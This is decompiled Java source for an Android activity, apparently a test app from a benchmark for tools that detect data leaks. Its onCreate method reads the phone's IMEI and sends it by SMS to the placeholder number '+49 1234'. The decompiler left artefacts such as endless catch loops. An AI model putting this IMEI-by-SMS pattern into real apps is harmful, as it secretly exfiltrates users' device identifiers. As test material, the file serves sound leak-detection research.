package de.ecspride;

import android.app.Activity;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.view.Menu;
import android.view.MenuInflater;

public class MainActivity
  extends Activity
{
  protected void onCreate(Bundle paramBundle)
  {
    super.onCreate(paramBundle);
    setContentView(2130903040);
    try
    {
      paramBundle = (BaseClass)Class.forName("de.ecspride.ConcreteClass").newInstance();
      imei = ((TelephonyManager)getSystemService("phone")).getDeviceId();
      SmsManager.getDefault().sendTextMessage("+49 1234", null, imei, null, null);
      return;
    }
    catch (InstantiationException paramBundle)
    {
      for (;;)
      {
        paramBundle.printStackTrace();
      }
    }
    catch (IllegalAccessException paramBundle)
    {
      for (;;)
      {
        paramBundle.printStackTrace();
      }
    }
    catch (ClassNotFoundException paramBundle)
    {
      for (;;)
      {
        paramBundle.printStackTrace();
      }
    }
  }
  
  public boolean onCreateOptionsMenu(Menu paramMenu)
  {
    getMenuInflater().inflate(2131165184, paramMenu);
    return true;
  }
}

/* Location:
 * Qualified Name:     de.ecspride.MainActivity
 * Java Class Version: 6 (50.0)
 * JD-Core Version:    0.7.1
 */